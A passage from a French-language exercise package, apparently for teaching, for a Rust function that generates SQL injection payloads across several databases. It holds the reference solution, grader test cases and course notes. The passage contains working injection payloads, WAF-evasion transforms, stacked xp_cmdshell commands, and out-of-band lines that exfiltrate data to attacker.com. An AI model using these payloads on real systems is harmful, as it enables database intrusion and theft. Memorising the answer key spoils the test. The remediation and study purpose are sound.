        "MSSQL" => format!("{} AND IIF(1=1,1,0)=1{}", quote, comment),
        "Oracle" => format!("{} AND CASE WHEN (1=1) THEN 1 ELSE 1/0 END=1{}", quote, comment),
        _ => format!("{} AND 1=1{}", quote, comment),
    }
}

fn generate_blind_time_payload(challenge: &SqlChallenge, detection: &Detection) -> String {
    let quote = if detection.quote_type == "single" { "'" } else { "" };
    let comment = get_comment_syntax(&challenge.database);

    match challenge.database.as_str() {
        "MySQL" => format!("{} AND SLEEP(5){}", quote, comment),
        "PostgreSQL" => format!("{} AND pg_sleep(5){}", quote, comment),
        "MSSQL" => format!("{} WAITFOR DELAY '0:0:5'{}", quote, comment),
        "Oracle" => format!("{} AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1{}", quote, comment),
        _ => format!("{} AND SLEEP(5){}", quote, comment),
    }
}

fn generate_error_payload(challenge: &SqlChallenge, detection: &Detection) -> String {
    let quote = if detection.quote_type == "single" { "'" } else { "" };
    let comment = get_comment_syntax(&challenge.database);

    match challenge.database.as_str() {
        "MySQL" => format!("{} AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){}", quote, comment),
        "PostgreSQL" => format!("{} AND 1=CAST(version() AS int){}", quote, comment),
        "MSSQL" => format!("{} AND 1=CONVERT(int,@@version){}", quote, comment),
        "Oracle" => format!("{} AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1)){}", quote, comment),
        _ => format!("{} AND 1=CONVERT(int,@@version){}", quote, comment),
    }
}

fn generate_stacked_payload(challenge: &SqlChallenge, detection: &Detection) -> String {
    let quote = if detection.quote_type == "single" { "'" } else { "" };

    match challenge.database.as_str() {
        "MSSQL" => format!("{}; EXEC xp_cmdshell 'whoami'--", quote),
        "PostgreSQL" => format!("{}; SELECT pg_sleep(5)--", quote),
        _ => format!("{}; SELECT 1--", quote),
    }
}

fn generate_oob_payload(challenge: &SqlChallenge, detection: &Detection) -> String {
    let quote = if detection.quote_type == "single" { "'" } else { "" };

    match challenge.database.as_str() {
        "MySQL" => format!("{} AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--", quote),
        "MSSQL" => format!("{}; EXEC master..xp_dirtree '\\\\attacker.com\\a'--", quote),
        "Oracle" => format!("{} AND UTL_HTTP.REQUEST('http://attacker.com/'||version())=1--", quote),
        _ => format!("{} AND 1=1--", quote),
    }
}

fn get_comment_syntax(database: &str) -> &'static str {
    match database {
        "MySQL" => "-- -",
        "PostgreSQL" => "--",
        "MSSQL" => "--",
        "Oracle" => "--",
        "SQLite" => "--",
        _ => "-- -",
    }
}

fn get_system_table(database: &str) -> &'static str {
    match database {
        "MySQL" => "information_schema.tables",
        "PostgreSQL" => "pg_catalog.pg_tables",
        "MSSQL" => "sys.tables",
        "Oracle" => "all_tables",
        "SQLite" => "sqlite_master",
        _ => "information_schema.tables",
    }
}

// ==================== WAF BYPASS ====================

fn apply_waf_bypass(payload: &str, blocked: &HashSet<String>, waf_level: u8) -> String {
    let mut result = payload.to_string();

    for keyword in blocked {
        let lower = keyword.to_lowercase();
        let bypass = match waf_level {
            0 | 1 => {
                // Simple case variation
                alternate_case(&lower)
            }
            2 => {
                // Comment injection
                inject_comments(&lower)
            }
            _ => {
                // URL encoding hint (hex)
                format!("0x{}", hex::encode(&lower))
            }
        };

        // Replace exact match with bypass
        result = result.replace(keyword, &bypass);
        result = result.replace(&lower, &bypass);
        result = result.replace(&keyword.to_uppercase(), &bypass);
    }

    result
}

fn alternate_case(s: &str) -> String {
    s.chars()
        .enumerate()
        .map(|(i, c)| if i % 2 == 0 { c.to_uppercase().next().unwrap() } else { c })
        .collect()
}

fn inject_comments(s: &str) -> String {
    s.chars()
        .enumerate()
        .map(|(i, c)| {
            if i > 0 && i < s.len() - 1 && i % 2 == 1 {
                format!("{}/**/", c)
            } else {
                c.to_string()
            }
        })
        .collect()
}

// ==================== EXTRACTION STEPS ====================

fn generate_extraction_steps(challenge: &SqlChallenge, detection: &Detection) -> Vec<String> {
    match challenge.challenge_type.as_str() {
        "UNION_BASED" => vec![
            format!("1. Determine column count: ' ORDER BY {}-- -", detection.column_count.unwrap_or(4)),
            "2. Find injectable columns: ' UNION SELECT NULL,'test',NULL,NULL-- -".to_string(),
            "3. Extract table names from system tables".to_string(),
            "4. Extract column names from target table".to_string(),
            "5. Extract data with final payload".to_string(),
        ],
        "BLIND_BOOLEAN" => vec![
            "1. Confirm injection point: ' AND 1=1-- (true) vs ' AND 1=2-- (false)".to_string(),
            "2. Enumerate length: ' AND LENGTH(database())=N-- ".to_string(),
            "3. Extract char by char: ' AND SUBSTRING(database(),1,1)='a'-- ".to_string(),
            "4. Build complete value from confirmed characters".to_string(),
        ],
        "BLIND_TIME" => vec![
            "1. Confirm time-based: ' AND SLEEP(5)-- (5s delay = injectable)".to_string(),
            "2. Binary search ASCII values for efficiency".to_string(),
            "3. Extract char: ' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(2),0)-- ".to_string(),
            "4. Narrow down with binary search (7 requests per char max)".to_string(),
        ],
        "ERROR_BASED" => vec![
            "1. Trigger error with type conversion".to_string(),
            "2. Read data from error message".to_string(),
            "3. Extract incrementally using LIMIT/OFFSET".to_string(),
        ],
        _ => vec![
            "1. Identify injection point".to_string(),
            "2. Determine exploitation technique".to_string(),
            "3. Extract target data".to_string(),
        ],
    }
}

// ==================== REMEDIATION ====================

fn generate_remediation(challenge: &SqlChallenge) -> Remediation {
    let (code, explanation) = match challenge.database.as_str() {
        "MySQL" => (
            "let stmt = conn.prepare(\"SELECT * FROM users WHERE id = ?\")?;\nlet result = stmt.execute(&[&id])?;".to_string(),
            "Use prepared statements with ? placeholders. Never concatenate user input directly into SQL queries.".to_string()
        ),
        "PostgreSQL" => (
            "let stmt = client.prepare(\"SELECT * FROM users WHERE id = $1\")?;\nlet result = client.query(&stmt, &[&id])?;".to_string(),
            "Use prepared statements with $1, $2... placeholders. PostgreSQL supports typed parameters.".to_string()
        ),
        "MSSQL" => (
            "using (var cmd = new SqlCommand(\"SELECT * FROM users WHERE id = @id\", conn))\n{\n    cmd.Parameters.AddWithValue(\"@id\", id);\n}".to_string(),
            "Use parameterized queries with @param placeholders in MSSQL.".to_string()
        ),
        _ => (
            "stmt = conn.prepare(\"SELECT * FROM users WHERE id = ?\")\nstmt.execute([id])".to_string(),
            "Always use parameterized queries regardless of the DBMS.".to_string()
        ),
    };

    Remediation {
        code,
        explanation,
        cwe: "CWE-89: SQL Injection".to_string(),
    }
}

// ==================== METADATA ====================

fn generate_metadata(challenge: &SqlChallenge) -> Metadata {
    let version_payload = match challenge.database.as_str() {
        "MySQL" => "SELECT @@version",
        "PostgreSQL" => "SELECT version()",
        "MSSQL" => "SELECT @@version",
        "Oracle" => "SELECT * FROM v$version",
        "SQLite" => "SELECT sqlite_version()",
        _ => "SELECT version()",
    };

    let (cvss, severity) = match challenge.challenge_type.as_str() {
        "UNION_BASED" | "ERROR_BASED" => (9.8, "CRITICAL"),
        "STACKED" | "OOB" => (10.0, "CRITICAL"),
        "BLIND_BOOLEAN" | "BLIND_TIME" => (8.5, "HIGH"),
        _ => (7.5, "HIGH"),
    };

    Metadata {
        dbms: challenge.database.clone(),
        version_detection_payload: version_payload.to_string(),
        cvss_estimate: cvss,
        severity: severity.to_string(),
    }
}
```

### 4.4 Solutions alternatives accept√©es

#### Alternative A : Pattern Matching avec Regex

```rust
use regex::Regex;

fn analyze_injection_point_regex(challenge: &SqlChallenge) -> Detection {
    let query = &challenge.vulnerable_query;

    // Regex pour d√©tecter le quote type
    let single_quote_re = Regex::new(r"'\$\w+'").unwrap();
    let double_quote_re = Regex::new(r#""\$\w+""#).unwrap();

    let quote_type = if single_quote_re.is_match(query) {
        "single"
    } else if double_quote_re.is_match(query) {
        "double"
    } else {
        "none"
    };

    // Regex pour extraire le param√®tre
    let param_re = Regex::new(r"\$(\w+)").unwrap();
    let vulnerable_parameter = param_re.captures(query)
        .map(|c| format!("${}", &c[1]))
        .unwrap_or_else(|| "$input".to_string());

    Detection {
        injection_type: challenge.challenge_type.clone(),
        column_count: estimate_column_count(query),
        injectable_columns: vec![2, 3],
        quote_type: quote_type.to_string(),
        vulnerable_parameter,
    }
}
```

#### Alternative B : Builder Pattern pour Payloads

```rust
struct PayloadBuilder {
    quote: String,
    comment: String,
    database: String,
}

impl PayloadBuilder {
    fn new(detection: &Detection, database: &str) -> Self {
        PayloadBuilder {
            quote: match detection.quote_type.as_str() {
                "single" => "'".to_string(),
                "double" => "\"".to_string(),
                _ => String::new(),
            },
            comment: get_comment_syntax(database).to_string(),
            database: database.to_string(),
        }
    }

    fn union_based(&self, columns: u32) -> String {
        let nulls: Vec<&str> = vec!["NULL"; columns as usize];
        format!("{} UNION SELECT {}{}", self.quote, nulls.join(","), self.comment)
    }

    fn blind_time(&self) -> String {
        let sleep_fn = match self.database.as_str() {
            "MySQL" => "SLEEP(5)",
            "PostgreSQL" => "pg_sleep(5)",
            "MSSQL" => "WAITFOR DELAY '0:0:5'",
            _ => "SLEEP(5)",
        };
        format!("{} AND {}{}", self.quote, sleep_fn, self.comment)
    }
}
```

### 4.5 Solutions refus√©es (avec explications)

#### ‚ùå Refus√©e A : Payloads hardcod√©s

```rust
// REFUS√â : Ne supporte pas diff√©rents DBMS ni contraintes
fn generate_payload_hardcoded(challenge_type: &str) -> String {
    match challenge_type {
        "UNION_BASED" => "' UNION SELECT * FROM users-- ".to_string(),
        "BLIND_BOOLEAN" => "' AND 1=1-- ".to_string(),
        _ => "' OR 1=1-- ".to_string(),
    }
}
// Pourquoi refus√© : Ignore database, column_count, blocked_keywords
// Ne respecte pas max_payload_length
```

#### ‚ùå Refus√©e B : Pas de validation d'entr√©e

```rust
// REFUS√â : Panic sur entr√©e invalide
fn sql_injection_laboratory_no_validation(input_json: &str) -> String {
    let challenge: SqlChallenge = serde_json::from_str(input_json).unwrap(); // PANIC!
    // ... reste du code
}
// Pourquoi refus√© : .unwrap() sur JSON invalide = crash
// Production code doit g√©rer les erreurs gracieusement
```

#### ‚ùå Refus√©e C : WAF bypass na√Øf

```rust
// REFUS√â : Bypass trop simple, facilement d√©tectable
fn apply_waf_bypass_naive(payload: &str, blocked: &[String]) -> String {
    let mut result = payload.to_string();
    for keyword in blocked {
        // Simple remplacement par rien
        result = result.replace(keyword, "");
    }
    result
}
// Pourquoi refus√© : Supprime le keyword au lieu de le transformer
// R√©sultat : "' SELECT * FROM users" devient "' * FROM users" = invalide
```

### 4.6 Solution bonus de r√©f√©rence

```rust
pub fn sql_injection_laboratory_advanced(input_json: &str) -> String {
    // ... validation identique ...

    let challenge: SqlChallenge = match serde_json::from_str(input_json) {
        Ok(c) => c,
        Err(e) => return error_json(&format!("Parse error: {}", e)),
    };

    // DBMS Fingerprinting automatique
    let fingerprint = fingerprint_dbms(&challenge.vulnerable_query);

    // G√©n√©ration de variants polymorphiques
    let variants = generate_polymorphic_variants(&challenge, &fingerprint);

    // Plan d'extraction blind optimis√©
    let blind_plan = create_blind_extraction_plan(&challenge);

    // Analyse second-order
    let second_order = analyze_second_order(&challenge);

    // Techniques d'√©vasion WAF
    let evasion_techniques = get_waf_evasion_techniques(challenge.constraints.waf_level);

    let result = AdvancedResult {
        dbms_fingerprint: fingerprint,
        payload_variants: variants,
        blind_extraction: blind_plan,
        second_order_check: second_order,
        waf_evasion_techniques: evasion_techniques,
    };

    serde_json::to_string_pretty(&result).unwrap()
}

fn fingerprint_dbms(query: &str) -> DbmsFingerprint {
    // Analyse des fonctions et syntaxe
    let mysql_indicators = ["LIMIT", "AUTO_INCREMENT", "IFNULL", "@@"];
    let pg_indicators = ["SERIAL", "COALESCE", "::int", "ILIKE"];
    let mssql_indicators = ["TOP", "GETDATE()", "@@IDENTITY", "NVARCHAR"];

    let query_upper = query.to_uppercase();

    let mysql_score: u32 = mysql_indicators.iter()
        .filter(|i| query_upper.contains(*i))
        .count() as u32;
    let pg_score: u32 = pg_indicators.iter()
        .filter(|i| query_upper.contains(*i))
        .count() as u32;
    let mssql_score: u32 = mssql_indicators.iter()
        .filter(|i| query_upper.contains(*i))
        .count() as u32;

    let (detected, confidence) = if mysql_score >= pg_score && mysql_score >= mssql_score {
        ("MySQL", 0.7 + (mysql_score as f32 * 0.1))
    } else if pg_score >= mssql_score {
        ("PostgreSQL", 0.7 + (pg_score as f32 * 0.1))
    } else {
        ("MSSQL", 0.7 + (mssql_score as f32 * 0.1))
    };

    DbmsFingerprint {
        detected_dbms: detected.to_string(),
        confidence: confidence.min(0.99),
        detection_method: "syntax_analysis".to_string(),
        version_estimate: None,
    }
}

fn create_blind_extraction_plan(challenge: &SqlChallenge) -> BlindExtractionPlan {
    BlindExtractionPlan {
        algorithm: "binary_search".to_string(),
        requests_per_char: 7, // log2(128) for ASCII
        estimated_total_requests: 7 * 50, // 50 chars estimation
        sample_payloads: vec![
            "' AND ASCII(SUBSTRING(database(),1,1))>64-- ".to_string(),
            "' AND ASCII(SUBSTRING(database(),1,1))>96-- ".to_string(),
            "' AND ASCII(SUBSTRING(database(),1,1))>112-- ".to_string(),
        ],
    }
}

fn generate_polymorphic_variants(challenge: &SqlChallenge, fp: &DbmsFingerprint) -> Vec<PayloadVariant> {
    let base = generate_union_payload_simple(&challenge);

    vec![
        PayloadVariant { technique: "Original".into(), payload: base.clone(), evasion_level: 0 },
        PayloadVariant { technique: "Case_Variation".into(), payload: alternate_case(&base), evasion_level: 1 },
        PayloadVariant { technique: "Comment_Injection".into(), payload: inject_inline_comments(&base), evasion_level: 2 },
        PayloadVariant { technique: "URL_Encoding".into(), payload: url_encode_keywords(&base), evasion_level: 3 },
        PayloadVariant { technique: "Double_Encoding".into(), payload: double_url_encode(&base), evasion_level: 4 },
    ]
}
```

### 4.10 Solutions Mutantes (minimum 6)

#### Mutant A (Boundary) : Off-by-one dans column count

```rust
fn estimate_column_count_mutant_a(query: &str) -> Option<u32> {
    if query.to_uppercase().contains("SELECT *") {
        Some(3) // BUG: Devrait √™tre 4, off-by-one
    } else {
        Some(4)
    }
}
// Pourquoi faux : Le payload UNION √©chouera car column count incorrect
// Ce qui √©tait pens√© : "3 colonnes suffisent g√©n√©ralement"
```

#### Mutant B (Safety) : Pas de validation NULL

```rust
pub fn sql_injection_laboratory_mutant_b(input_json: &str) -> String {
    // BUG: Pas de check pour null/empty
    let challenge: SqlChallenge = serde_json::from_str(input_json).unwrap();
    // ... continue sans validation
}
// Pourquoi faux : Panic sur "null" ou JSON invalide
// Ce qui √©tait pens√© : "Le JSON sera toujours valide"
```

#### Mutant C (Resource) : Allocation infinie sur regex

```rust
fn apply_waf_bypass_mutant_c(payload: &str, blocked: &HashSet<String>, level: u8) -> String {
    let mut result = payload.to_string();

    // BUG: Boucle infinie si le bypass cr√©e le m√™me mot
    while blocked.iter().any(|b| result.to_uppercase().contains(&b.to_uppercase())) {
        for keyword in blocked {
            result = result.replace(keyword, &format!("{}/**/", keyword));
        }
    }
    result
}
// Pourquoi faux : "UNION" devient "UNION/**/" qui contient toujours "UNION"
// Ce qui √©tait pens√© : "Le commentaire devrait casser le match"
```

#### Mutant D (Logic) : Condition invers√©e

```rust
fn generate_payload_mutant_d(challenge: &SqlChallenge, detection: &Detection) -> Result<String, String> {
    let payload = generate_union_payload(challenge, detection);

    // BUG: Condition invers√©e
    if payload.len() < challenge.constraints.max_payload_length {
        Err("Payload too long".to_string())  // INVERS√â!
    } else {
        Ok(payload)
    }
}
// Pourquoi faux : Rejette les payloads valides, accepte les trop longs
// Ce qui √©tait pens√© : Confusion entre < et >
```

#### Mutant E (Return) : Toujours retourne le m√™me CVSS

```rust
fn generate_metadata_mutant_e(challenge: &SqlChallenge) -> Metadata {
    Metadata {
        dbms: challenge.database.clone(),
        version_detection_payload: "SELECT version()".to_string(),
        cvss_estimate: 5.0,  // BUG: Hardcod√©, ignore le type d'injection
        severity: "MEDIUM".to_string(),
    }
}
// Pourquoi faux : Une injection STACKED/OOB est CRITICAL (10.0), pas MEDIUM
// Ce qui √©tait pens√© : "Toutes les SQLi ont le m√™me impact"
```

#### Mutant F (Edge Case) : Ne g√®re pas SQLite

```rust
fn get_comment_syntax_mutant_f(database: &str) -> &'static str {
    match database {
        "MySQL" => "-- -",
        "PostgreSQL" => "--",
        "MSSQL" => "--",
        "Oracle" => "--",
        // BUG: SQLite manquant, va au _ qui retourne MySQL syntax
        _ => "-- -",
    }
}
// Pourquoi faux : SQLite utilise "--" pas "-- -"
// Ce qui √©tait pens√© : "Le default MySQL marchera partout"
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "sql_injection_laboratory",
  "language": "rust",
  "version": "edition2024",
  "type": "code",
  "tier": 2,
  "tier_info": "M√©lange (concepts a + b + c + d + e + f + k)",
  "tags": ["sqli", "injection", "owasp", "database", "security", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "sql_injection_laboratory",
    "prototype": "pub fn sql_injection_laboratory(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [
      {"name": "input_json", "type": "&str"}
    ]
  },

  "driver": {
    "reference": "pub fn ref_sql_injection_laboratory(input_json: &str) -> String { if input_json.trim().is_empty() || input_json.trim() == \"null\" { return r#\"{\"error\":\"NULL_INPUT\"}\"#.to_string(); } let challenge: SqlChallenge = match serde_json::from_str(input_json) { Ok(c) => c, Err(_) => return r#\"{\"error\":\"PARSE_ERROR\"}\"#.to_string() }; let detection = analyze_injection_point(&challenge); let payload = generate_payload(&challenge, &detection).unwrap_or_default(); serde_json::json!({\"detection\": detection, \"payload\": payload}).to_string() }",

    "edge_cases": [
      {
        "name": "union_mysql_basic",
        "args": ["{\"challenge_type\":\"UNION_BASED\",\"vulnerable_query\":\"SELECT * FROM users WHERE id = '$id'\",\"database\":\"MySQL\",\"objective\":\"Extract users\",\"constraints\":{\"max_payload_length\":100,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": ["UNION", "SELECT"],
        "is_trap": false
      },
      {
        "name": "blind_boolean_pg",
        "args": ["{\"challenge_type\":\"BLIND_BOOLEAN\",\"vulnerable_query\":\"SELECT * FROM users WHERE id = '$id'\",\"database\":\"PostgreSQL\",\"objective\":\"Check admin\",\"constraints\":{\"max_payload_length\":200,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": ["AND", "CASE"],
        "is_trap": false
      },
      {
        "name": "blind_time_mysql",
        "args": ["{\"challenge_type\":\"BLIND_TIME\",\"vulnerable_query\":\"SELECT * FROM users WHERE id = $id\",\"database\":\"MySQL\",\"objective\":\"Extract DB\",\"constraints\":{\"max_payload_length\":200,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": ["SLEEP"],
        "is_trap": false
      },
      {
        "name": "error_based_mssql",
        "args": ["{\"challenge_type\":\"ERROR_BASED\",\"vulnerable_query\":\"SELECT * FROM products WHERE id = $id\",\"database\":\"MSSQL\",\"objective\":\"Version\",\"constraints\":{\"max_payload_length\":100,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": ["CONVERT"],
        "is_trap": false
      },
      {
        "name": "waf_bypass_union",
        "args": ["{\"challenge_type\":\"UNION_BASED\",\"vulnerable_query\":\"SELECT * FROM users WHERE id = '$id'\",\"database\":\"MySQL\",\"objective\":\"Extract\",\"constraints\":{\"max_payload_length\":150,\"blocked_keywords\":[\"UNION\"],\"waf_level\":1}}"],
        "expected_not_contains": ["UNION"],
        "is_trap": true,
        "trap_explanation": "Must bypass UNION keyword"
      },
      {
        "name": "null_input",
        "args": ["null"],
        "expected_contains": ["error"],
        "is_trap": true,
        "trap_explanation": "NULL input must return error"
      },
      {
        "name": "invalid_json",
        "args": ["{broken"],
        "expected_contains": ["error"],
        "is_trap": true,
        "trap_explanation": "Invalid JSON must return error"
      },
      {
        "name": "empty_query",
        "args": ["{\"challenge_type\":\"UNION_BASED\",\"vulnerable_query\":\"\",\"database\":\"MySQL\",\"objective\":\"X\",\"constraints\":{\"max_payload_length\":100,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": ["error"],
        "is_trap": true,
        "trap_explanation": "Empty query must return error"
      },
      {
        "name": "stacked_mssql",
        "args": ["{\"challenge_type\":\"STACKED\",\"vulnerable_query\":\"SELECT * FROM users WHERE id = '$id'\",\"database\":\"MSSQL\",\"objective\":\"RCE\",\"constraints\":{\"max_payload_length\":200,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": [";"],
        "is_trap": false
      },
      {
        "name": "oob_mysql",
        "args": ["{\"challenge_type\":\"OOB\",\"vulnerable_query\":\"SELECT * FROM users WHERE id = '$id'\",\"database\":\"MySQL\",\"objective\":\"Exfil\",\"constraints\":{\"max_payload_length\":300,\"blocked_keywords\":[],\"waf_level\":0}}"],
        "expected_contains": ["LOAD_FILE"],
        "is_trap": false
      }
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 500,
      "generators": [
        {
          "type": "enum",
          "param_index": 0,
          "field": "challenge_type",
          "values": ["UNION_BASED", "BLIND_BOOLEAN", "BLIND_TIME", "ERROR_BASED", "STACKED", "OOB"]
        },
        {
          "type": "enum",
          "param_index": 0,
          "field": "database",
          "values": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"]
        }
      ]
    }
  },

  "norm": {
    "allowed_functions": ["serde_json::from_str", "serde_json::to_string", "regex::Regex"],
    "forbidden_functions": ["std::process::Command", "std::fs", "unsafe"],
    "check_security": true,
    "check_memory": true,
    "blocking": true
  },

  "bonus": {
    "enabled": true,
    "function_name": "sql_injection_laboratory_advanced",
    "multiplier": 6,
    "tier": "GENIUS"
  }
}
```

---

## üß† SECTION 5 : COMPRENDRE (DOCUMENT DE COURS COMPLET)

### 5.1 Ce que cet exercice enseigne

| Concept | Description | Importance |
|---------|-------------|------------|
| **Types d'injection** | UNION, Blind, Error-based, OOB, Stacked | Fondamental |
| **Diff√©rences DBMS** | Syntaxe MySQL vs PostgreSQL vs MSSQL vs Oracle | Critique |
| **Detection** | Identifier quote type, column count, param√®tre vuln√©rable | Essentiel |
| **WAF Bypass** | Case variation, comments, encoding | Avanc√© |
| **Remediation** | Prepared statements, parameterized queries | D√©fensif |

### 5.2 LDA ‚Äî Traduction litt√©rale en fran√ßais (MAJUSCULES)

```
FONCTION sql_injection_laboratory QUI RETOURNE UNE CHA√éNE ET PREND EN PARAM√àTRE input_json QUI EST UNE R√âF√âRENCE VERS UNE CHA√éNE
D√âBUT FONCTION

    SI input_json EST VIDE OU √âGAL √Ä "null" ALORS
        RETOURNER UN JSON D'ERREUR "NULL_INPUT"
    FIN SI

    D√âCLARER challenge COMME R√âSULTAT DU PARSING JSON DE input_json
    SI LE PARSING √âCHOUE ALORS
        RETOURNER UN JSON D'ERREUR "PARSE_ERROR"
    FIN SI

    SI LA REQU√äTE VULN√âRABLE EST VIDE ALORS
        RETOURNER UN JSON D'ERREUR "EMPTY_QUERY"
    FIN SI

    D√âCLARER detection COMME R√âSULTAT DE analyze_injection_point(challenge)
    D√âCLARER payload COMME R√âSULTAT DE generate_payload(challenge, detection)

    SI LA G√âN√âRATION √âCHOUE ALORS
        RETOURNER L'ERREUR
    FIN SI

    D√âCLARER extraction_steps COMME LISTE DES √âTAPES D'EXTRACTION
    D√âCLARER remediation COMME CODE CORRIG√â AVEC EXPLICATION
    D√âCLARER metadata COMME INFORMATIONS DBMS ET CVSS

    RETOURNER LE R√âSULTAT S√âRIALIS√â EN JSON

FIN FONCTION
```

### 5.2.2 Logic Flow (Structured English)

```
ALGORITHME : SQL Injection Laboratory
---
1. VALIDER l'entr√©e JSON
   a. SI null ou vide ‚Üí ERREUR
   b. SI JSON invalide ‚Üí ERREUR

2. PARSER le challenge
   a. EXTRAIRE challenge_type, database, query, constraints

3. ANALYSER le point d'injection
   a. D√âTECTER le type de quote ('  "  aucun)
   b. IDENTIFIER le param√®tre vuln√©rable ($id, $user, etc.)
   c. ESTIMER le nombre de colonnes

4. G√âN√âRER le payload
   a. SELON challenge_type :
      - UNION_BASED  ‚Üí payload avec UNION SELECT
      - BLIND_BOOLEAN ‚Üí payload avec IF/CASE
      - BLIND_TIME   ‚Üí payload avec SLEEP/WAITFOR
      - ERROR_BASED  ‚Üí payload avec CONVERT/CAST
      - STACKED      ‚Üí payload avec ; et nouvelle requ√™te
      - OOB          ‚Üí payload avec DNS/HTTP exfiltration

5. APPLIQUER bypass WAF si n√©cessaire
   a. Case variation (UnIoN)
   b. Comment injection (UN/**/ION)
   c. Encoding (0x554e494f4e)

6. V√âRIFIER les contraintes
   a. max_payload_length respect√© ?
   b. blocked_keywords contourn√©s ?

7. G√âN√âRER remediation
   a. Code avec prepared statements
   b. Explication du fix

8. RETOURNER le r√©sultat complet
```

### 5.3 Visualisation ASCII

#### Architecture d'une Injection SQL

```
                         APPLICATION WEB
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                                                                 ‚îÇ
‚îÇ   UTILISATEUR                     SERVEUR                       ‚îÇ
‚îÇ   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                 ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê           ‚îÇ
‚îÇ   ‚îÇ Input:      ‚îÇ   HTTP POST     ‚îÇ                 ‚îÇ           ‚îÇ
‚îÇ   ‚îÇ id=' OR 1=1 ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫‚îÇ  Backend Code   ‚îÇ           ‚îÇ
‚îÇ   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                 ‚îÇ                 ‚îÇ           ‚îÇ
‚îÇ                                   ‚îÇ  query = "SELECT * FROM     ‚îÇ
‚îÇ                                   ‚îÇ   users WHERE id='" + id    ‚îÇ
‚îÇ                                   ‚îÇ                 ‚îÇ           ‚îÇ
‚îÇ                                   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò           ‚îÇ
‚îÇ                                            ‚îÇ                    ‚îÇ
‚îÇ                                            ‚ñº                    ‚îÇ
‚îÇ                          ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê        ‚îÇ
‚îÇ                          ‚îÇ         DATABASE            ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ                             ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ  SELECT * FROM users        ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ  WHERE id='' OR 1=1--'      ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ         ‚Üë                   ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ    INJECTION ICI!           ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ    (Condition toujours      ‚îÇ        ‚îÇ
‚îÇ                          ‚îÇ     vraie = tous les users) ‚îÇ        ‚îÇ
‚îÇ                          ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

